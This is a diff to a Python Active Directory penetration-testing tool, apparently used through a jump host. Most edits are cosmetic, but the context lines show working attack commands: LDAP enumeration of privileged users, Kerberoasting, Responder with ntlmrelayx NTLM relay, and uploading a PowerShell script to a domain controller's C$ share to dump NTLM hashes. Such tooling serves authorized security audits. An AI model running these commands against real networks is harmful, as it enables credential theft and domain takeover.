@@ -41,7 +41,7 @@ def run_ssh_command(hostname, command):
 
     return output, error
 
-def run_scp_command(hostname, remote_path, local_path, metode):
+def run_scp_command(hostname, path1, path2, metode):
     # Check if we have an existing connection
     if hostname not in _ssh_connections:
         run_ssh_command(hostname, "echo")  # This will create the connection
@@ -53,10 +53,10 @@ def run_scp_command(hostname, remote_path, local_path, metode):
     
     try:
         if metode == 'get':
-            _sftp_connections[hostname].get(remote_path, local_path)
+            _sftp_connections[hostname].get(path1, path2)
 
         if metode == 'put':
-            _sftp_connections[hostname].put(local_path, remote_path)
+            _sftp_connections[hostname].put(path1, path2)
     except Exception as e:
         return f'SCP failed: {str(e)}'
     
@@ -81,7 +81,6 @@ class Color:
 def color_text(text: str, color: str) -> str:
     """Return colored text if output is a terminal, otherwise plain text."""
     return f"{color}{text}{Color.END}" if sys.stdout.isatty() else text
-
 
 def check_ssh_config(host):
     """Check if the host exists in SSH config"""
@@ -300,7 +299,6 @@ def en_users(jh, dc_ip, user, password, domain):
     create_rem_dir = 'mkdir users-dump'
     create = run_ssh_command(jh, create_rem_dir)
     
-    
     command1 = "ldapsearch -x -H ldap://" + dc_ip + " -D '" + user + "' -w '" + password + "' -E pr=1000/noprompt -b '" + dns + "' '(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' sAMAccountName | grep -E '^sAMAccountName:' | cut -d ':' -f 2 | cut -d ' ' -f 2 > users-dump/enabled_users"
 
     command2 = "ldapsearch -x -H ldap://" + dc_ip + " -D '" + user + "' -w '" + password + "' -E pr=1000/noprompt -b '" + dns + "' '(|(memberOf=CN=Domain Admins,"+dns+")(memberOf=CN=Enterprise Admins,CN=Users,"+dns+")(memberOf=CN=Schema Admins,CN=Users,"+dns+")(memberOf=CN=Administrators,CN=Builtin,"+dns+"))' sAMAccountName memberOf | grep -E '^sAMAccountName:' | cut -d ':' -f 2 | cut -d ' ' -f 2 > users-dump/high_priv_users"
@@ -325,7 +323,6 @@ def en_users(jh, dc_ip, user, password, domain):
     run_scp_command(jh, 'users-dump/enabled_users', f'users-dump/enabled_users', 'get')
     run_scp_command(jh, 'users-dump/high_priv_users', f'users-dump/high_priv_users', 'get')
     run_scp_command(jh, 'users-dump/users_descriptions', f'users-dump/users_descriptions', 'get')
-
 
 def roasting(jh, dc_ip, user, password, domain):
     netexec = run_ssh_command(jh, 'command -v netexec')
@@ -353,7 +350,6 @@ def roasting(jh, dc_ip, user, password, domain):
     run_scp_command(jh, 'roasting/kerberoasted-users', 'roasting/kerberoasted-users', 'get')
     run_scp_command(jh, 'roasting/asreproasted-users', 'roasting/asreproasted-users', 'get')
 
-
 def responder_run(jh, config_file=None):
     if config_file:
         # checking for tools
@@ -377,6 +373,7 @@ def responder_run(jh, config_file=None):
                 print(f'The following tool is missing: {item}')
             exit()
 
+        print(color_text('\nGrabbing network interface to listen on...\n', Color.BOLD))
         # grab ethernet interface to listen on
         interface = run_ssh_command(jh, 'ip a')
         interfaces = []
@@ -394,6 +391,7 @@ def responder_run(jh, config_file=None):
             if iface != 'lo' and not iface.startswith(('docker', 'br-', 'veth', 'tun')):
                 ifp.append(iface)
 
+        print(color_text('\nGrabbing target list from the config file...\n', Color.BOLD))
         # grab smb signing disabled list
         targets = ''
         for host in config_file['hosts']:
@@ -404,26 +402,33 @@ def responder_run(jh, config_file=None):
         # create remote directory
         create_rem_dir = 'mkdir relayx'
         create = run_ssh_command(jh, create_rem_dir)
-    
+
+        print(color_text('\nUploading target list...\n', Color.BOLD))
         # write target list to kali box
         command = f'echo "{targets}" > relayx/scope-signing'
         run_ssh_command(jh, command)
 
+        print(color_text('\nFinding smb signing disabled hosts...', Color.BOLD))
         # start netexec to create no smg signing list
         command = 'netexec smb relayx/scope-signing --gen-relay-list relayx/no-smb-signing.txt'
         run_ssh_command(jh, command)        
 
+        print(color_text('\nMaking sure smb and http are off...', Color.BOLD))
         # turn smb and http off
         smb_off = "sudo sed -i '/^SMB[[:space:]]*=/ s/On/Off/; /^HTTP[[:space:]]*=/ s/On/Off/' /etc/responder/Responder.conf"
         stopping = run_ssh_command(jh, smb_off)
 
+        print(color_text('\nStarting responder...', Color.BOLD))
         # start responder
         command = 'sudo responder -Pv -I '+ifp[0]
         start_resp = run_ssh_command(jh, f"tmux new-session -d -s 'responder' '{command}'")
 
+        print(color_text('\nStarting ntlmrelayx with smb2support and socks...', Color.BOLD))
         # start ntlmrelayx
         command = 'impacket-ntlmrelayx -tf relayx/no-smb-signing.txt -smb2support -socks'
         start_relay =  run_ssh_command(jh, f"tmux new-session -d -s 'ntlmrelayx' '{command}'")
+
+        print(color_text('\nEverything worked well probably! Responder and ntlmrelayx are running!', Color.BOLD))
                 
     else:
         # checking for tools
@@ -441,7 +446,7 @@ def responder_run(jh, config_file=None):
                 print(f'The following tool is missing: {item}')
             exit()
 
-    
+        print(color_text('\nGrabbing network interface to listen on...', Color.BOLD))
         interface = run_ssh_command(jh, 'ip a')
         interfaces = []
         for line in interface[0].split('\n'):
@@ -458,18 +463,17 @@ def responder_run(jh, config_file=None):
             if iface != 'lo' and not iface.startswith(('docker', 'br-', 'veth', 'tun')):
                 ifp.append(iface)
 
+        print(color_text('\nMaking sure smb and http are on...', Color.BOLD))
         # make sure smb and http are on
         smb = "sudo sed -i '/^SMB[[:space:]]*=/ s/Off/On/; /^HTTP[[:space:]]*=/ s/Off/On/' /etc/responder/Responder.conf"
         smb_on = run_ssh_command(jh, smb)
 
+        print(color_text('\nStarting responder...', Color.BOLD))
         # start responder
         command = 'sudo responder -Pv -I '+ifp[0]
         start_resp = run_ssh_command(jh, f"tmux new-session -d -s 'responder' '{command}'")
 
-
-
-
-
+        print(color_text('\nAll done! If everything worked well responder is running!', Color.GREEN))
 
 def pas_audit(dc_ip, user, password, domain, jh=None, verbose=False):
     powershell_code = r'''
@@ -508,7 +512,7 @@ diskshadow.exe /s $ScriptPath | Tee-Object -FilePath $outputFile
         exit()
     smbclient = run_ssh_command(jh, 'command -v smbclient')
     if len(smbclient[0]) == 0:
-        print(color_text('\nThe following tool is missing: smbclient\n',Color.RED))
+        print(color_text('The following tool is missing: smbclient\n',Color.RED))
 
     with open(f'audit.ps1', 'w') as f:
             f.write(powershell_code)
@@ -519,7 +523,7 @@ diskshadow.exe /s $ScriptPath | Tee-Object -FilePath $outputFile
 
         script2 = run_scp_command(jh, 'audit.ps1', 'audit.ps1', 'put')
 
-        print(color_text('\nUploading audit.ps1 file to the target.\n', Color.BOLD))
+        print(color_text('Uploading audit.ps1 file to the target.\n', Color.BOLD))
 
         command12 = "smbclient //"+dc_ip+"/C$ -U '"+domain+"/"+user+"' --password='"+password+"' -c 'put audit.ps1 Windows/Temp/audit.ps1'"
 
@@ -584,7 +588,6 @@ diskshadow.exe /s $ScriptPath | Tee-Object -FilePath $outputFile
             running = subprocess.run(command, capture_output=True, text=True)
             print(color_text('\nNtlm hashes dumped! That was easy, right?', Color.GREEN))
 
-
         enabled_users_list = None
         with open(f'users-dump/enabled_users', 'r') as f:
             enabled_users_list = set(line.strip().lower() for line in f if line.strip())
@@ -607,12 +610,8 @@ diskshadow.exe /s $ScriptPath | Tee-Object -FilePath $outputFile
                     out.write(line + '\n')
         
     else:
-        print('jumphost not provided, this side of the module is not ready yet.')
+        print('jumphost not provided, this side of the module is not ready yet so please provide a jumphost :). ')
 
-    
-    
-
-    
 
 def is_tool_installed(tool):
     try:
@@ -621,7 +620,6 @@ def is_tool_installed(tool):
         return False
     except:
         return False
-
     
 def main():
     parser = argparse.ArgumentParser(description="Run nmap scan in tmux on remote host")
@@ -713,8 +711,6 @@ def main():
             pas_audit(args.dc_ip, args.user, args.password, args.domain, args.jumphost, args.verbose)
         else:
             pas_audit(args.dc_ip, args.user, args.password, args.domain)
-        # pas_audit()
-        # print('yes its password audit')
 
     if args.mode == 'parse' :
         print('Hello')
